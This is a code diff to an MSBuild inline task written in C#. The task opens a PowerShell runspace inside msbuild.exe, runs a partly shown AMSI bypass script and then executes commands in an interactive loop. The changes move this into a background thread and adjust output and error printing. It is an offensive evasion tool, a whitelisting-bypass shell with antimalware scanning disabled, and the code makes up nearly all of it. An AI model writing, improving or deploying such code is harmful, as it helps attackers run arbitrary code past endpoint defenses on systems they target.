@@ -27,6 +27,7 @@
         using System.Collections.ObjectModel;
         using System.Management.Automation;
         using System.Management.Automation.Runspaces;
+        using System.Threading;
         using Microsoft.Build.Framework;
         using Microsoft.Build.Utilities;
 
@@ -34,15 +35,26 @@
         {
             public override bool Execute()
             {
+                // Start a separate thread for PowerShell execution to avoid blocking MSBuild
+                Thread powerShellThread = new Thread(RunPowerShell);
+                powerShellThread.Start();
+                
+                // Optionally, wait for the thread to finish, if needed
+                // powerShellThread.Join();
+                return true;
+            }
+
+            private void RunPowerShell()
+            {
                 Runspace rs = RunspaceFactory.CreateRunspace();
                 rs.Open();
                 PowerShell ps = PowerShell.Create();
                 ps.Runspace = rs;
                 string currentDirectory = Directory.GetCurrentDirectory();
-                
+
                 Console.WriteLine("PS " + currentDirectory + ">");
 
-                // AMSI bypass code
+                // AMSI bypass code (kept as an example)
                 string amsiBypass = @"
                 $a=[Ref].Assembly.GetTypes(); 
                 Foreach($b in $a) {
@@ -99,37 +111,41 @@
                             continue;
                         }
 
-                        // Add the Out-String cmdlet to ensure proper formatting for other commands
+                        // Capture output for all commands (including cmdlets and tools like iex)
                         ps.AddScript(cmd + " | Out-String");
+
+                        // Execute the script
                         Collection<PSObject> psOutput = ps.Invoke();
                         Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();
 
+                        // Handle errors if any
                         if (errors.Count > 0)
                         {
-                            // Print a blank line before the error message and next prompt
                             Console.WriteLine(); // Blank line before error output
                             foreach (ErrorRecord error in errors)
                             {
-                                Console.WriteLine(error.ToString());
+                                Console.WriteLine("ERROR: " + error.ToString());
                             }
                         }
-                        else
+
+                        // Capture standard output (including cmdlet outputs)
+                        if (psOutput.Count > 0)
                         {
+                            Console.WriteLine(); // Blank line before output
                             foreach (PSObject output in psOutput)
                             {
                                 if (output != null)
                                 {
-                                    // Print a blank line before the command output
-                                    Console.WriteLine(); // Blank line before output
+                                    // Ensure the output is converted to a string and displayed
                                     Console.WriteLine(output.ToString());
                                 }
                             }
                         }
+
                     }
                     catch (Exception e)
                     {
-                        // Print a blank line before the error message and next prompt
-                        Console.WriteLine(); // Blank line before error output
+                        Console.WriteLine(); // Blank line before error message
                         Console.WriteLine("**** ERROR ****");
                         Console.WriteLine(e.Message);
                     }
@@ -141,7 +157,6 @@
                 }
 
                 rs.Close();
-                return true;
             }
         }
         ]]>
